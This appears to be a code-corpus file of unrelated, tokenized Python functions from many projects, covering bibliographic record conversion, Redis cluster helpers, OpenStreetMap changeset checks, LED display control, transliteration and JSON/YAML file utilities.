def get_collection ( self , journal ) : conference = '' for tag in self . document . getElementsByTagName ( 'conference' ) : conference = xml_to_text ( tag ) if conference or journal == "International Journal of Modern Physics: Conference Series" : return [ ( 'a' , 'HEP' ) , ( 'a' , 'ConferencePaper' ) ] elif self . _get_article_type ( ) == "review-article" : return [ ( 'a' , 'HEP' ) , ( 'a' , 'Review' ) ] else : return [ ( 'a' , 'HEP' ) , ( 'a' , 'Published' ) ]
def _attach_fulltext ( self , rec , doi ) : url = os . path . join ( self . url_prefix , doi ) record_add_field ( rec , 'FFT' , subfields = [ ( 'a' , url ) , ( 't' , 'INSPIRE-PUBLIC' ) , ( 'd' , 'Fulltext' ) ] )
def get_config_item ( cls , key , kb_name , allow_substring = True ) : config_dict = cls . kbs . get ( kb_name , None ) if config_dict : if key in config_dict : return config_dict [ key ] elif allow_substring : res = [ v for k , v in config_dict . items ( ) if key in k ] if res : return res [ 0 ] return key
def match ( self , query = None , * * kwargs ) : from invenio . search_engine import perform_request_search if not query : # We use default setup recid = self . record [ "001" ] [ 0 ] [ 3 ] return perform_request_search ( p = "035:%s" % ( recid , ) , of = "id" ) else : if "recid" not in kwargs : kwargs [ "recid" ] = self . record [ "001" ] [ 0 ] [ 3 ] return perform_request_search ( p = query % kwargs , of = "id" )
def keep_only_fields ( self ) : for tag in self . record . keys ( ) : if tag not in self . fields_list : record_delete_fields ( self . record , tag )
def strip_fields ( self ) : for tag in self . record . keys ( ) : if tag in self . fields_list : record_delete_fields ( self . record , tag )
def add_systemnumber ( self , source , recid = None ) : if not recid : recid = self . get_recid ( ) if not self . hidden and recid : record_add_field ( self . record , tag = '035' , subfields = [ ( '9' , source ) , ( 'a' , recid ) ] )
def add_control_number ( self , tag , value ) : record_add_field ( self . record , tag , controlfield_value = value )
def update_subject_categories ( self , primary , secondary , kb ) : category_fields = record_get_field_instances ( self . record , tag = '650' , ind1 = '1' , ind2 = '7' ) record_delete_fields ( self . record , "650" ) for field in category_fields : for idx , ( key , value ) in enumerate ( field [ 0 ] ) : if key == 'a' : new_value = self . get_config_item ( value , kb ) if new_value != value : new_subs = [ ( '2' , secondary ) , ( 'a' , new_value ) ] else : new_subs = [ ( '2' , primary ) , ( 'a' , value ) ] record_add_field ( self . record , "650" , ind1 = "1" , ind2 = "7" , subfields = new_subs ) break
def _get_reference ( self , ref ) : label = get_value_in_tag ( ref , 'label' ) label = re . sub ( '\D' , '' , label ) for innerref in ref . getElementsByTagName ( 'mixed-citation' ) : ref_type = innerref . getAttribute ( 'publication-type' ) institution = get_value_in_tag ( innerref , 'institution' ) report_no = '' for tag in innerref . getElementsByTagName ( 'pub-id' ) : if tag . getAttribute ( 'pub-id-type' ) == 'other' : if tag . hasChildNodes ( ) : report_no = get_all_text ( tag ) doi = '' for tag in innerref . getElementsByTagName ( 'pub-id' ) : if tag . getAttribute ( 'pub-id-type' ) == 'doi' : doi = xml_to_text ( tag ) collaboration = get_value_in_tag ( innerref , 'collab' ) authors = [ ] person_groups = innerref . getElementsByTagName ( 'person-group' ) for author_group in person_groups : if author_group . getAttribute ( 'person-group-type' ) == 'author' : for author in author_group . getElementsByTagName ( 'string-name' ) : if author . hasChildNodes ( ) : authors . append ( get_all_text ( author ) ) editors = [ ] for editor_group in person_groups : if editor_group . getAttribute ( 'person-group-type' ) == 'editor' : for editor in editor_group . getElementsByTagName ( 'string-name' ) : if editor . hasChildNodes ( ) : editors . append ( get_all_text ( editor ) ) journal = get_value_in_tag ( innerref , 'source' ) journal , volume = fix_journal_name ( journal , self . journal_mappings ) volume += get_value_in_tag ( innerref , 'volume' ) if journal == 'J.High Energy Phys.' or journal == 'JHEP' : issue = get_value_in_tag ( innerref , 'issue' ) volume = volume [ 2 : ] + issue journal = 'JHEP' page = get_value_in_tag ( innerref , 'page-range' ) year = get_value_in_tag ( innerref , 'year' ) external_link = get_value_in_tag ( innerref , 'ext-link' ) arxiv = '' for tag in innerref . getElementsByTagName ( 'pub-id' ) : if tag . getAttribute ( 'pub-id-type' ) == 'arxiv' : if tag . hasChildNodes ( ) : arxiv = get_all_text ( tag ) arxiv = format_arxiv_id ( arxiv ) publisher = get_value_in_tag ( innerref , 'publisher-name' ) publisher_location = get_value_in_tag ( innerref , 'publisher-loc' ) if publisher_location : publisher = publisher_location + ': ' + publisher unstructured_text = [ ] for child in innerref . childNodes : if child . nodeType == child . TEXT_NODE : text = child . nodeValue . strip ( ) text = re . sub ( r'[\[\]\(\.;\)]' , '' , text ) . strip ( ) if text . startswith ( ',' ) : text = text [ 1 : ] . strip ( ) if text . endswith ( 'Report No' ) : text = institution + " " + text institution = '' text = text . strip ( ) elif text . endswith ( ' ed' ) : text += '.' elif text . endswith ( 'PhD thesis,' ) : if institution : text += ' ' + institution institution = '' else : text = text [ : - 1 ] elif text . startswith ( 'Seminar,' ) : article_title = get_value_in_tag ( innerref , 'article-title' ) text = institution + " Seminar, \"" + article_title + "\"" institution = '' elif text == u'\u201d' : text = '' ignore_text = [ 'in' , 'pp' , 'edited by' ] if text . startswith ( 'Vol' ) : temp = re . sub ( r'\D' , '' , text ) if temp : volume += temp elif len ( text ) > 1 and text not in ignore_text and not ( text . isdigit ( ) or text [ : - 1 ] . isdigit ( ) ) : unstructured_text . append ( text ) if unstructured_text : unstructured_text = " " . join ( unstructured_text ) if ref_type == 'book' : if volume and not volume . lower ( ) . startswith ( 'vol' ) : volume = 'Vol ' + volume if volume and page : volume = volume + ', pp ' + page yield ref_type , doi , authors , collaboration , journal , volume , page , year , label , arxiv , publisher , institution , unstructured_text , external_link , report_no , editors
def _add_references ( self , rec ) : for ref in self . document . getElementsByTagName ( 'ref' ) : for ref_type , doi , authors , collaboration , journal , volume , page , year , label , arxiv , publisher , institution , unstructured_text , external_link , report_no , editors in self . _get_reference ( ref ) : subfields = [ ] if doi : subfields . append ( ( 'a' , doi ) ) for author in authors : subfields . append ( ( 'h' , author ) ) for editor in editors : subfields . append ( ( 'e' , editor ) ) if year : subfields . append ( ( 'y' , year ) ) if unstructured_text : if page : subfields . append ( ( 'm' , unstructured_text + ', ' + page ) ) else : subfields . append ( ( 'm' , unstructured_text ) ) if collaboration : subfields . append ( ( 'c' , collaboration ) ) if institution : subfields . append ( ( 'm' , institution ) ) if publisher : subfields . append ( ( 'p' , publisher ) ) if arxiv : subfields . append ( ( 'r' , arxiv ) ) if report_no : subfields . append ( ( 'r' , report_no ) ) if external_link : subfields . append ( ( 'u' , external_link ) ) if label : subfields . append ( ( 'o' , label ) ) if ref_type == 'book' : if journal : subfields . append ( ( 't' , journal ) ) if volume : subfields . append ( ( 'm' , volume ) ) elif page and not unstructured_text : subfields . append ( ( 'm' , page ) ) else : if volume and page : subfields . append ( ( 's' , journal + "," + volume + "," + page ) ) elif journal : subfields . append ( ( 't' , journal ) ) if ref_type : subfields . append ( ( 'd' , ref_type ) ) if not subfields : #misc-type references try : r = ref . getElementsByTagName ( 'mixed-citation' ) [ 0 ] text = xml_to_text ( r ) label = text . split ( ) [ 0 ] text = " " . join ( text . split ( ) [ 1 : ] ) subfields . append ( ( 's' , text ) ) record_add_field ( rec , '999' , ind1 = 'C' , ind2 = '5' , subfields = subfields ) except IndexError : #references without 'mixed-citation' tag try : r = ref . getElementsByTagName ( 'note' ) [ 0 ] subfields . append ( ( 's' , xml_to_text ( r ) ) ) record_add_field ( rec , '999' , ind1 = 'C' , ind2 = '5' , subfields = subfields ) except IndexError : #references without 'note' tag subfields . append ( ( 's' , xml_to_text ( ref ) ) ) record_add_field ( rec , '999' , ind1 = 'C' , ind2 = '5' , subfields = subfields ) else : record_add_field ( rec , '999' , ind1 = 'C' , ind2 = '5' , subfields = subfields )
def connect ( self ) : self . _ftp . connect ( ) self . _ftp . login ( user = self . _username , passwd = self . _passwd )
def parse_data ( self , text , maxwidth , maxheight , template_dir , context , urlize_all_links ) : # create a dictionary of user urls -> rendered responses replacements = { } user_urls = set ( re . findall ( URL_RE , text ) ) for user_url in user_urls : try : resource = oembed . site . embed ( user_url , maxwidth = maxwidth , maxheight = maxheight ) except OEmbedException : if urlize_all_links : replacements [ user_url ] = '<a href="%(LINK)s">%(LINK)s</a>' % { 'LINK' : user_url } else : context [ 'minwidth' ] = min ( maxwidth , resource . width ) context [ 'minheight' ] = min ( maxheight , resource . height ) replacement = self . render_oembed ( resource , user_url , template_dir = template_dir , context = context ) replacements [ user_url ] = replacement . strip ( ) # go through the text recording URLs that can be replaced # taking note of their start & end indexes user_urls = re . finditer ( URL_RE , text ) matches = [ ] for match in user_urls : if match . group ( ) in replacements : matches . append ( [ match . start ( ) , match . end ( ) , match . group ( ) ] ) # replace the URLs in order, offsetting the indices each go for indx , ( start , end , user_url ) in enumerate ( matches ) : replacement = replacements [ user_url ] difference = len ( replacement ) - len ( user_url ) # insert the replacement between two slices of text surrounding the # original url text = text [ : start ] + replacement + text [ end : ] # iterate through the rest of the matches offsetting their indices # based on the difference between replacement/original for j in xrange ( indx + 1 , len ( matches ) ) : matches [ j ] [ 0 ] += difference matches [ j ] [ 1 ] += difference return mark_safe ( text )
def __get_rev ( self , key , version , * * kwa ) : if '_doc' in kwa : doc = kwa [ '_doc' ] else : if type ( version ) is int : if version == 0 : order = pymongo . ASCENDING elif version == - 1 : order = pymongo . DESCENDING doc = self . _collection . find_one ( { 'k' : key } , sort = [ [ 'd' , order ] ] ) elif type ( version ) is datetime : ver = self . __round_time ( version ) doc = self . _collection . find_one ( { 'k' : key , 'd' : ver } ) if doc is None : raise KeyError ( 'Supplied key `{0}` or version `{1}` does not exist' . format ( key , str ( version ) ) ) coded_val = doc [ 'v' ] return pickle . loads ( coded_val )
def _hashkey ( self , method , url , * * kwa ) : to_hash = '' . join ( [ str ( method ) , str ( url ) , str ( kwa . get ( 'data' , '' ) ) , str ( kwa . get ( 'params' , '' ) ) ] ) return hashlib . md5 ( to_hash . encode ( ) ) . hexdigest ( )
def available_drivers ( ) : global __modules global __available if type ( __modules ) is not list : __modules = list ( __modules ) if not __available : __available = [ d . ahioDriverInfo . NAME for d in __modules if d . ahioDriverInfo . AVAILABLE ] return __available
def guess_array_memory_usage ( bam_readers , dtype , use_strand = False ) : ARRAY_COUNT = 5 if not isinstance ( bam_readers , list ) : bam_readers = [ bam_readers ] if isinstance ( dtype , basestring ) : dtype = NUMPY_DTYPES . get ( dtype , None ) use_strand = use_strand + 1 #if false, factor of 1, if true, factor of 2 dtypes = guess_numpy_dtypes_from_idxstats ( bam_readers , default = None , force_dtype = False ) if not [ dt for dt in dtypes if dt is not None ] : #found no info from idx dtypes = guess_numpy_dtypes_from_idxstats ( bam_readers , default = dtype or numpy . uint64 , force_dtype = True ) elif dtype : dtypes = [ dtype if dt else None for dt in dtypes ] read_groups = [ ] no_read_group = False for bam in bam_readers : rgs = bam . get_read_groups ( ) if rgs : for rg in rgs : if rg not in read_groups : read_groups . append ( rg ) else : no_read_group = True read_groups = len ( read_groups ) + no_read_group max_ref_size = 0 array_byte_overhead = sys . getsizeof ( numpy . zeros ( ( 0 ) , dtype = numpy . uint64 ) ) array_count = ARRAY_COUNT * use_strand * read_groups for bam in bam_readers : for i , ( name , length ) in enumerate ( bam . get_references ( ) ) : if dtypes [ i ] is not None : max_ref_size = max ( max_ref_size , ( length + length * dtypes [ i ] ( ) . nbytes * array_count + ( array_byte_overhead * ( array_count + 1 ) ) ) ) return max_ref_size
def main ( ) : usage = "Usage: %prog PATH_TO_PACKAGE" parser = optparse . OptionParser ( usage = usage ) parser . add_option ( "-v" , "--verbose" , action = "store_true" , dest = "verbose" , default = False , help = "Show debug output" ) parser . add_option ( "-d" , "--output-dir" , action = "store" , type = "string" , dest = "output_dir" , default = '' , help = "" ) parser . add_option ( "-t" , "--test-args" , action = "store" , type = "string" , dest = "test_args" , default = '' , help = ( "Pass argument on to bin/test. Quote the argument, " + "for instance \"-t '-m somemodule'\"." ) ) ( options , args ) = parser . parse_args ( ) if options . verbose : log_level = logging . DEBUG else : log_level = logging . INFO logging . basicConfig ( level = log_level , format = "%(levelname)s: %(message)s" ) curdir = os . getcwd ( ) testbinary = os . path . join ( curdir , 'bin' , 'test' ) if not os . path . exists ( testbinary ) : raise RuntimeError ( "Test command doesn't exist: %s" % testbinary ) coveragebinary = os . path . join ( curdir , 'bin' , 'coverage' ) if not os . path . exists ( coveragebinary ) : logger . debug ( "Trying globally installed coverage command." ) coveragebinary = 'coverage' logger . info ( "Running tests in coverage mode (can take a long time)" ) parts = [ coveragebinary , 'run' , testbinary ] if options . test_args : parts . append ( options . test_args ) system ( " " . join ( parts ) ) logger . debug ( "Creating coverage reports..." ) if options . output_dir : coverage_dir = options . output_dir open_in_browser = False else : coverage_dir = 'htmlcov' # The default open_in_browser = True system ( "%s html --directory=%s" % ( coveragebinary , coverage_dir ) ) logger . info ( "Wrote coverage files to %s" , coverage_dir ) if open_in_browser : index_file = os . path . abspath ( os . path . join ( coverage_dir , 'index.html' ) ) logger . debug ( "About to open %s in your webbrowser." , index_file ) webbrowser . open ( 'file://' + index_file ) logger . info ( "Opened reports in your browser." )
def output_entire_buffer ( self ) : green = 0 red = 0 for row in range ( 0 , 8 ) : for col in range ( 0 , 8 ) : if self . display_buffer [ row ] [ col ] == self . LED_GREEN : green |= 1 << col elif self . display_buffer [ row ] [ col ] == self . LED_RED : red |= 1 << col elif self . display_buffer [ row ] [ col ] == self . LED_YELLOW : green |= 1 << col red |= 1 << col elif self . display_buffer [ row ] [ col ] == self . LED_OFF : green &= ~ ( 1 << col ) red &= ~ ( 1 << col ) self . firmata . i2c_write ( 0x70 , row * 2 , 0 , green ) self . firmata . i2c_write ( 0x70 , row * 2 + 1 , 0 , red )
def clear_display_buffer ( self ) : for row in range ( 0 , 8 ) : self . firmata . i2c_write ( 0x70 , row * 2 , 0 , 0 ) self . firmata . i2c_write ( 0x70 , ( row * 2 ) + 1 , 0 , 0 ) for column in range ( 0 , 8 ) : self . display_buffer [ row ] [ column ] = 0
def retrieve_url ( self , url ) : try : r = requests . get ( url ) except requests . ConnectionError : raise exceptions . RetrieveError ( 'Connection fail' ) if r . status_code >= 400 : raise exceptions . RetrieveError ( 'Connected, but status code is %s' % ( r . status_code ) ) real_url = r . url content = r . content try : content_type = r . headers [ 'Content-Type' ] except KeyError : content_type , encoding = mimetypes . guess_type ( real_url , strict = False ) self . response = r return content_type . lower ( ) , content
def _getnodenamefor ( self , name ) : return 'node_' + str ( ( abs ( binascii . crc32 ( b ( name ) ) & 0xffffffff ) % self . no_servers ) + 1 )
def getnodefor ( self , name ) : node = self . _getnodenamefor ( name ) return { node : self . cluster [ 'nodes' ] [ node ] }
def object ( self , infotype , key ) : redisent = self . redises [ self . _getnodenamefor ( key ) + '_slave' ] return getattr ( redisent , 'object' ) ( infotype , key )
def _rc_mset ( self , mapping ) : result = True for k , v in iteritems ( mapping ) : result = result and self . set ( k , v ) return result
def _rc_mget ( self , keys , * args ) : args = list_or_args ( keys , args ) result = [ ] for key in args : result . append ( self . get ( key ) ) return result
def _rc_rename ( self , src , dst ) : if src == dst : return self . rename ( src + "{" + src + "}" , src ) if not self . exists ( src ) : return self . rename ( src + "{" + src + "}" , src ) self . delete ( dst ) ktype = self . type ( src ) kttl = self . ttl ( src ) if ktype == b ( 'none' ) : return False if ktype == b ( 'string' ) : self . set ( dst , self . get ( src ) ) elif ktype == b ( 'hash' ) : self . hmset ( dst , self . hgetall ( src ) ) elif ktype == b ( 'list' ) : for k in self . lrange ( src , 0 , - 1 ) : self . rpush ( dst , k ) elif ktype == b ( 'set' ) : for k in self . smembers ( src ) : self . sadd ( dst , k ) elif ktype == b ( 'zset' ) : for k , v in self . zrange ( src , 0 , - 1 , withscores = True ) : self . zadd ( dst , v , k ) # Handle keys with an expire time set kttl = - 1 if kttl is None or kttl < 0 else int ( kttl ) if kttl != - 1 : self . expire ( dst , kttl ) return self . delete ( src )
def _rc_renamenx ( self , src , dst ) : if self . exists ( dst ) : return False return self . _rc_rename ( src , dst )
def _rc_keys ( self , pattern = '*' ) : result = [ ] for alias , redisent in iteritems ( self . redises ) : if alias . find ( '_slave' ) == - 1 : continue result . extend ( redisent . keys ( pattern ) ) return result
def _rc_dbsize ( self ) : result = 0 for alias , redisent in iteritems ( self . redises ) : if alias . find ( '_slave' ) == - 1 : continue result += redisent . dbsize ( ) return result
def prepare ( self ) : # Create a collection for the attributes and elements of # this instance. attributes , elements = OrderedDict ( ) , [ ] # Initialize the namespace map. nsmap = dict ( [ self . meta . namespace ] ) # Iterate through all declared items. for name , item in self . _items . items ( ) : if isinstance ( item , Attribute ) : # Prepare the item as an attribute. attributes [ name ] = item . prepare ( self ) elif isinstance ( item , Element ) : # Update the nsmap. nsmap . update ( [ item . namespace ] ) # Prepare the item as an element. elements . append ( item ) # Return the collected attributes and elements return attributes , elements , nsmap
def get_queryset ( self , request ) : qs = super ( GalleryAdmin , self ) . get_queryset ( request ) return qs . annotate ( photo_count = Count ( 'photos' ) )
def save_model ( self , request , obj , form , change ) : obj . author = request . user obj . save ( )
def save_formset ( self , request , form , formset , change ) : instances = formset . save ( commit = False ) for instance in instances : if isinstance ( instance , Photo ) : instance . author = request . user instance . save ( )
def convert_ranges ( cls , ranges , length ) : result = [ ] for start , end in ranges : if end is None : result . append ( ( start , length - 1 ) ) elif start is None : s = length - end result . append ( ( 0 if s < 0 else s , length - 1 ) ) else : result . append ( ( start , end if end < length else length - 1 ) ) return result
def condense_ranges ( cls , ranges ) : result = [ ] if ranges : ranges . sort ( key = lambda tup : tup [ 0 ] ) result . append ( ranges [ 0 ] ) for i in range ( 1 , len ( ranges ) ) : if result [ - 1 ] [ 1 ] + 1 >= ranges [ i ] [ 0 ] : result [ - 1 ] = ( result [ - 1 ] [ 0 ] , max ( result [ - 1 ] [ 1 ] , ranges [ i ] [ 1 ] ) ) else : result . append ( ranges [ i ] ) return result
def print_read ( self , rid ) : if self . rname is not None : print self . rname [ rid ] print '--' r = self . get_read_data ( rid ) aligned_loci = np . unique ( r . nonzero ( ) [ 1 ] ) for locus in aligned_loci : nzvec = r [ : , locus ] . todense ( ) . transpose ( ) [ 0 ] . A . flatten ( ) if self . lname is not None : print self . lname [ locus ] , else : print locus , print nzvec
def _setup ( ) : s = str . split if sys . version_info < ( 3 , 0 ) : s = unicode . split def pop_all ( some_dict , some_list ) : for scheme in some_list : some_dict . pop ( scheme ) global SCHEMES SCHEMES = copy . deepcopy ( sanscript . SCHEMES ) pop_all ( SCHEMES , [ sanscript . ORIYA , sanscript . BENGALI , sanscript . GUJARATI ] ) SCHEMES [ HK ] . update ( { 'vowels' : s ( """a A i I u U R RR lR lRR E ai O au""" ) + s ( """e o""" ) , 'marks' : s ( """A i I u U R RR lR lRR E ai O au""" ) + s ( """e o""" ) , 'consonants' : sanscript . SCHEMES [ HK ] [ 'consonants' ] + s ( """n2 r2 zh""" ) } ) SCHEMES [ ITRANS ] . update ( { 'vowels' : s ( """a A i I u U R RR LLi LLI E ai O au""" ) + s ( """e o""" ) , 'marks' : s ( """A i I u U R RR LLi LLI E ai O au""" ) + s ( """e o""" ) , 'consonants' : sanscript . SCHEMES [ ITRANS ] [ 'consonants' ] + s ( """n2 r2 zh""" ) } ) pop_all ( SCHEMES [ ITRANS ] . synonym_map , s ( """e o""" ) ) SCHEMES [ OPTITRANS ] . update ( { 'vowels' : s ( """a A i I u U R RR LLi LLI E ai O au""" ) + s ( """e o""" ) , 'marks' : s ( """A i I u U R RR LLi LLI E ai O au""" ) + s ( """e o""" ) , 'consonants' : sanscript . SCHEMES [ OPTITRANS ] [ 'consonants' ] + s ( """n2 r2 zh""" ) } ) pop_all ( SCHEMES [ OPTITRANS ] . synonym_map , s ( """e o""" ) )
def to_utf8 ( y ) : out = [ ] for x in y : if x < 0x080 : out . append ( x ) elif x < 0x0800 : out . append ( ( x >> 6 ) | 0xC0 ) out . append ( ( x & 0x3F ) | 0x80 ) elif x < 0x10000 : out . append ( ( x >> 12 ) | 0xE0 ) out . append ( ( ( x >> 6 ) & 0x3F ) | 0x80 ) out . append ( ( x & 0x3F ) | 0x80 ) else : out . append ( ( x >> 18 ) | 0xF0 ) out . append ( ( x >> 12 ) & 0x3F ) out . append ( ( ( x >> 6 ) & 0x3F ) | 0x80 ) out . append ( ( x & 0x3F ) | 0x80 ) return '' . join ( map ( chr , out ) )
def set_script ( self , i ) : if i in range ( 1 , 10 ) : n = i - 1 else : raise IllegalInput ( "Invalid Value for ATR %s" % ( hex ( i ) ) ) if n > - 1 : # n = -1 is the default script .. self . curr_script = n self . delta = n * DELTA return
def _unrecognised ( chr ) : if options [ 'handleUnrecognised' ] == UNRECOGNISED_ECHO : return chr elif options [ 'handleUnrecognised' ] == UNRECOGNISED_SUBSTITUTE : return options [ 'substituteChar' ] else : raise ( KeyError , chr )
def clear_sent_messages ( self , offset = None ) : if offset is None : offset = getattr ( settings , 'MAILQUEUE_CLEAR_OFFSET' , defaults . MAILQUEUE_CLEAR_OFFSET ) if type ( offset ) is int : offset = datetime . timedelta ( hours = offset ) delete_before = timezone . now ( ) - offset self . filter ( sent = True , last_attempt__lte = delete_before ) . delete ( )
def get_orthographies ( self , _library = library ) : results = [ ] for charset in _library . charsets : if self . _charsets : cn = getattr ( charset , 'common_name' , False ) abbr = getattr ( charset , 'abbreviation' , False ) nn = getattr ( charset , 'short_name' , False ) naive = getattr ( charset , 'native_name' , False ) if cn and cn . lower ( ) in self . _charsets : results . append ( charset ) elif nn and nn . lower ( ) in self . _charsets : results . append ( charset ) elif naive and naive . lower ( ) in self . _charsets : results . append ( charset ) elif abbr and abbr . lower ( ) in self . _charsets : results . append ( charset ) else : results . append ( charset ) for result in results : yield CharsetInfo ( self , result )
def generate_oauth2_headers ( self ) : encoded_credentials = base64 . b64encode ( ( '{0}:{1}' . format ( self . consumer_key , self . consumer_secret ) ) . encode ( 'utf-8' ) ) headers = { 'Authorization' : 'Basic {0}' . format ( encoded_credentials . decode ( 'utf-8' ) ) , 'Content-Type' : 'application/x-www-form-urlencoded' } return headers
def get_data ( filename ) : name , ext = get_file_extension ( filename ) func = json_get_data if ext == '.json' else yaml_get_data return func ( filename )
def write_data ( data , filename ) : name , ext = get_file_extension ( filename ) func = json_write_data if ext == '.json' else yaml_write_data return func ( data , filename )
def json_write_data ( json_data , filename ) : with open ( filename , 'w' ) as fp : json . dump ( json_data , fp , indent = 4 , sort_keys = True , ensure_ascii = False ) return True return False
def json_get_data ( filename ) : with open ( filename ) as fp : json_data = json . load ( fp ) return json_data return False
def yaml_get_data ( filename ) : with open ( filename , 'rb' ) as fd : yaml_data = yaml . load ( fd ) return yaml_data return False
def yaml_write_data ( yaml_data , filename ) : with open ( filename , 'w' ) as fd : yaml . dump ( yaml_data , fd , default_flow_style = False ) return True return False
def __get_live_version ( self ) : try : import versiontools except ImportError : return None else : return str ( versiontools . Version . from_expression ( self . name ) )
def is_categorical_type ( ary ) : ary = np . asanyarray ( ary ) return is_integer_type ( ary ) or ary . dtype . kind == 'b'
def _build_indices ( X , flann_args ) : # TODO: should probably multithread this logger . info ( "Building indices..." ) indices = [ None ] * len ( X ) for i , bag in enumerate ( plog ( X , name = "index building" ) ) : indices [ i ] = idx = FLANNIndex ( * * flann_args ) idx . build_index ( bag ) return indices
def _get_rhos ( X , indices , Ks , max_K , save_all_Ks , min_dist ) : logger . info ( "Getting within-bag distances..." ) if max_K >= X . n_pts . min ( ) : msg = "asked for K = {}, but there's a bag with only {} points" raise ValueError ( msg . format ( max_K , X . n_pts . min ( ) ) ) # need to throw away the closest neighbor, which will always be self # thus K=1 corresponds to column 1 in the result array which_Ks = slice ( 1 , None ) if save_all_Ks else Ks indices = plog ( indices , name = "within-bag distances" ) rhos = [ None ] * len ( X ) for i , ( idx , bag ) in enumerate ( zip ( indices , X ) ) : r = np . sqrt ( idx . nn_index ( bag , max_K + 1 ) [ 1 ] [ : , which_Ks ] ) np . maximum ( min_dist , r , out = r ) rhos [ i ] = r return rhos
def _get_Ks ( self ) : Ks = as_integer_type ( self . Ks ) if Ks . ndim != 1 : raise TypeError ( "Ks should be 1-dim, got shape {}" . format ( Ks . shape ) ) if Ks . min ( ) < 1 : raise ValueError ( "Ks should be positive; got {}" . format ( Ks . min ( ) ) ) return Ks
def _flann_args ( self , X = None ) : args = { 'cores' : self . _n_jobs } if self . flann_algorithm == 'auto' : if X is None or X . dim > 5 : args [ 'algorithm' ] = 'linear' else : args [ 'algorithm' ] = 'kdtree_single' else : args [ 'algorithm' ] = self . flann_algorithm if self . flann_args : args . update ( self . flann_args ) # check that arguments are correct try : FLANNParameters ( ) . update ( args ) except AttributeError as e : msg = "flann_args contains an invalid argument:\n  {}" raise TypeError ( msg . format ( e ) ) return args
def make_stacked ( self ) : if self . stacked : return self . _boundaries = bounds = np . r_ [ 0 , np . cumsum ( self . n_pts ) ] self . stacked_features = stacked = np . vstack ( self . features ) self . features = np . array ( [ stacked [ bounds [ i - 1 ] : bounds [ i ] ] for i in xrange ( 1 , len ( bounds ) ) ] , dtype = object ) self . stacked = True
def bare ( self ) : if not self . meta : return self elif self . stacked : return Features ( self . stacked_features , self . n_pts , copy = False ) else : return Features ( self . features , copy = False )
def run ( self ) : logger . info ( u'Started listening' ) while not self . _stop : xml = self . _readxml ( ) # Exit on invalid XML if xml is None : break # Raw xml only if not self . modelize : logger . info ( u'Raw xml: %s' % xml ) self . results . put ( xml ) continue # Model objects + raw xml as fallback if xml . tag == 'RECOGOUT' : sentence = Sentence . from_shypo ( xml . find ( 'SHYPO' ) , self . encoding ) logger . info ( u'Modelized recognition: %r' % sentence ) self . results . put ( sentence ) else : logger . info ( u'Unmodelized xml: %s' % xml ) self . results . put ( xml ) logger . info ( u'Stopped listening' )
def disconnect ( self ) : logger . info ( u'Disconnecting' ) self . sock . shutdown ( socket . SHUT_RDWR ) self . sock . close ( ) self . state = DISCONNECTED
def cli ( id ) : ch = Analyse ( id ) ch . full_analysis ( ) click . echo ( 'Created: %s. Modified: %s. Deleted: %s' % ( ch . create , ch . modify , ch . delete ) ) if ch . is_suspect : click . echo ( 'The changeset {} is suspect! Reasons: {}' . format ( id , ', ' . join ( ch . suspicion_reasons ) ) ) else : click . echo ( 'The changeset %s is not suspect!' % id )
def filter ( self ) : self . content = [ ch for ch in self . xml . getchildren ( ) if get_bounds ( ch ) . intersects ( self . area ) ]
def label_suspicious ( self , reason ) : self . suspicion_reasons . append ( reason ) self . is_suspect = True
def full_analysis ( self ) : self . count ( ) self . verify_words ( ) self . verify_user ( ) if self . review_requested == 'yes' : self . label_suspicious ( 'Review requested' )
def verify_editor ( self ) : powerful_editors = [ 'josm' , 'level0' , 'merkaartor' , 'qgis' , 'arcgis' , 'upload.py' , 'osmapi' , 'Services_OpenStreetMap' ] if self . editor is not None : for editor in powerful_editors : if editor in self . editor . lower ( ) : self . powerfull_editor = True break if 'iD' in self . editor : trusted_hosts = [ 'www.openstreetmap.org/id' , 'www.openstreetmap.org/edit' , 'improveosm.org' , 'strava.github.io/iD' , 'preview.ideditor.com/release' , 'preview.ideditor.com/master' , 'hey.mapbox.com/iD-internal' , 'projets.pavie.info/id-indoor' , 'maps.mapcat.com/edit' , 'id.softek.ir' ] if self . host . split ( '://' ) [ - 1 ] . strip ( '/' ) not in trusted_hosts : self . label_suspicious ( 'Unknown iD instance' ) else : self . powerfull_editor = True self . label_suspicious ( 'Software editor was not declared' )
def spawn ( self , generations ) : egg_donors = [ god for god in self . gods . values ( ) if god . chromosomes == 'XX' ] sperm_donors = [ god for god in self . gods . values ( ) if god . chromosomes == 'XY' ] for i in range ( generations ) : print ( "\nGENERATION %d\n" % ( i + 1 ) ) gen_xx = [ ] gen_xy = [ ] for egg_donor in egg_donors : sperm_donor = random . choice ( sperm_donors ) brood = self . breed ( egg_donor , sperm_donor ) for child in brood : if child . divinity > human : # divine offspring join the Pantheon self . add_god ( child ) if child . chromosomes == 'XX' : gen_xx . append ( child ) else : gen_xy . append ( child ) # elder gods leave the breeding pool egg_donors = [ ed for ed in egg_donors if ed . generation > ( i - 2 ) ] sperm_donors = [ sd for sd in sperm_donors if sd . generation > ( i - 3 ) ] # mature offspring join the breeding pool egg_donors += gen_xx sperm_donors += gen_xy
def breed ( self , egg_donor , sperm_donor ) : offspring = [ ] try : num_children = npchoice ( [ 1 , 2 ] , 1 , p = [ 0.8 , 0.2 ] ) [ 0 ] # 20% chance of twins for _ in range ( num_children ) : child = God ( egg_donor , sperm_donor ) offspring . append ( child ) send_birth_announcement ( egg_donor , sperm_donor , child ) except ValueError : print ( "Breeding error occurred. Likely the generator ran out of names." ) return offspring
def cosine ( vec1 , vec2 ) : if norm ( vec1 ) > 0 and norm ( vec2 ) > 0 : return dot ( vec1 , vec2 ) / ( norm ( vec1 ) * norm ( vec2 ) ) else : return 0.0
def set_name_lists ( ethnicity = None ) : if not ethnicity : ethnicity = random . choice ( get_ethnicities ( ) ) print ( "Loading names from: " + ethnicity ) filename = names_dir + ethnicity + '.json' try : with open ( filename , 'r' ) as injson : data = json . load ( injson ) except : return 'Unable to read from file: ' + filename else : names = [ tuple ( name . split ( ',' ) ) for name in data ] random . shuffle ( names ) global female_names female_names = [ name for name , gender ,  * desc in names if gender == 'girl' ] global male_names male_names = [ name for name , gender ,  * desc in names if gender == 'boy' ] global nb_names nb_names = [ name for name , gender ,  * desc in names if gender == 'boygirl' ]
def set_inherited_traits ( self , egg_donor , sperm_donor ) : if type ( egg_donor ) == str : self . reproduce_asexually ( egg_donor , sperm_donor ) else : self . reproduce_sexually ( egg_donor , sperm_donor )
